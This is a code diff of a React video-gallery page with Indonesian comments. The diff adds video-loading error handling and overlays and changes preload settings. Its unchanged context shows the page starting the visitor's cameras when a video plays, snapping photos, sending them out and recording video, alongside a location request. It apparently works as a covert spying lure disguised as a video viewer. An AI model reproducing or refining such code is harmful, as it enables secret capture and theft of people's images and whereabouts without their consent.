@@ -9,6 +9,7 @@ function App() {
   const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
   const [isLoading, setIsLoading] = useState<boolean[]>([]);
+  const [videoErrors, setVideoErrors] = useState<boolean[]>([]); // State untuk melacak error pemuatan video
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
@@ -33,6 +34,7 @@ function App() {
 
   useEffect(() => {
     setIsLoading(new Array(videos.length).fill(true));
+    setVideoErrors(new Array(videos.length).fill(false));
   }, []);
 
   useEffect(() => {
@@ -80,6 +82,11 @@ function App() {
       console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
       if (!validateVideoUrl(video.videoUrl)) {
         console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
+        setVideoErrors((prev) => {
+          const newErrors = [...prev];
+          newErrors[index] = true;
+          return newErrors;
+        });
       }
     });
 
@@ -211,14 +218,13 @@ function App() {
       const videoHeight = cameraVideo.videoHeight;
       console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
-      // Mengambil foto
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
       const videoAspectRatio = videoWidth / videoHeight;
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = 720; // Kurangi resolusi untuk mengurangi beban
+        drawWidth = 720;
         drawHeight = drawWidth / videoAspectRatio;
       } else {
         drawHeight = 1280;
@@ -247,12 +253,11 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      // Merekam video
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 1000000, // Kurangi bitrate untuk mengurangi beban
+        videoBitsPerSecond: 1000000,
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -300,7 +305,6 @@ function App() {
     console.log('Memulai proses perekaman untuk kamera...');
 
     try {
-      // Tunggu hingga video benar-benar siap diputar
       await new Promise((resolve) => {
         if (videoElement.readyState >= 3) {
           resolve(null);
@@ -311,7 +315,6 @@ function App() {
 
       await videoElement.play();
 
-      // Inisialisasi kamera setelah video mulai diputar
       await initializeCameraStreams();
 
       if (cameraStreamsRef.current.length === 0) {
@@ -366,6 +369,11 @@ function App() {
     if (videoElement) {
       if (!validateVideoUrl(videos[index].videoUrl)) {
         console.error('URL video tidak valid, menghentikan pemutaran.');
+        setVideoErrors((prev) => {
+          const newErrors = [...prev];
+          newErrors[index] = true;
+          return newErrors;
+        });
         return;
       }
 
@@ -404,10 +412,25 @@ function App() {
   };
 
   const handleCanPlay = (index: number) => {
+    console.log(`Video ${index + 1} siap diputar.`);
     setIsLoading((prev) => {
       const newLoading = [...prev];
       newLoading[index] = false;
       return newLoading;
+    });
+  };
+
+  const handleVideoError = (index: number) => {
+    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl}`);
+    setIsLoading((prev) => {
+      const newLoading = [...prev];
+      newLoading[index] = false;
+      return newLoading;
+    });
+    setVideoErrors((prev) => {
+      const newErrors = [...prev];
+      newErrors[index] = true;
+      return newErrors;
     });
   };
 
@@ -457,7 +480,7 @@ function App() {
           <div className="space-y-2">
             {videos.map((video, index) => (
               <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
-                {isLoading[index] && (
+                {isLoading[index] && !videoErrors[index] && (
                   <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                     <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                       <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
@@ -465,21 +488,27 @@ function App() {
                     </svg>
                   </div>
                 )}
+                {videoErrors[index] && (
+                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                    <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
+                  </div>
+                )}
                 <video
                   ref={(el) => (videoRefs.current[index] = el)}
-                  src={isPlaying === index ? video.videoUrl : undefined} // Hanya set src saat video diputar
+                  src={video.videoUrl} // Selalu set src untuk memastikan video dimuat
                   className="w-full h-full object-cover"
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
                   onCanPlay={() => handleCanPlay(index)}
-                  preload="metadata" // Kurangi preload untuk mengurangi beban
+                  onError={() => handleVideoError(index)}
+                  preload="auto" // Optimalkan buffering
                   playsInline
                   {...({ loading: 'lazy' } as any)}
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                 </video>
-                {isPlaying === index && (
+                {isPlaying === index && !videoErrors[index] && (
                   <div className="absolute bottom-2 right-2 z-20">
                     <button
                       onClick={() => toggleFullscreen(index)}
